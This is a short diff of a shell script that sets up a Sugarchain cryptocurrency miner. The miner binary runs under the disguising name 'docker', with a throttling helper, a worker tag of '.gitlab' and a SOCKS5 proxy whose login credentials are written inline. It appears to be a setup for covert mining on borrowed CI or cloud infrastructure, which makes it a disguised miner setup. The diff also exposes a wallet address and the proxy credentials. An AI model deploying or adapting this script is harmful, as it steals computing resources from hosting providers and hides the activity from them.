@@ -1,8 +1,8 @@
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x docker 
-screen -dmS ls 
+chmod +x docker limit.sh
+screen -dmS limit ./limit.sh 00 65 75
 POOL=1pool.sugarchain.org:3333
-WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.free
-PROXY=socks5://150.129.171.123:6667
-./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
+WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.gitlab
+PROXY=socks5://woiden_adz:212@sg-socks5.woiden.net:8080
+./docker -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
